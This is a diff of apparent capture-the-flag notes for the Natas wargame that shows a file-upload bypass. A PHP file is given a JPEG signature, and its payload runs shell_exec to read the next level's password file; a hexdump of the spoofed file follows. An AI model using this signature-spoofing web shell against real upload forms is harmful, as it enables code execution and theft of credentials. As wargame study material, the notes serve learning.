@@ -125,7 +125,7 @@ Choose a JPEG to upload (max 1KB):<br/>
 </body>
 </html>
 
-# Create new .png name test.png
+# Create new test.png ⌨️
 
 # Fake an image file signature
 #!/bin/python
@@ -139,10 +139,10 @@ with open("test.php", "wb") as f:
     f.write(b'\xFF\xD9')
 
 # Open in Notepad++
-ÿØÿàshell_exec("cat /etc/natas_webpass/natas14");
+ÿØÿàshell_exec("cat /etc/natas_webpass/natas14"); ⌨️
 
 # Open in hexdump
-@trungdullc ➜ /workspaces/01noobHacker (main) $ hexdump static/test.png
+@trungdullc ➜ /workspaces/01noobHacker (main) $ hexdump static/test.png ⌨️
 0000000 d8ff e0ff 6873 6c65 5f6c 7865 6365 2228
 0000010 6163 2074 652f 6374 6e2f 7461 7361 775f
 0000020 6265 6170 7373 6e2f 7461 7361 3431 2922
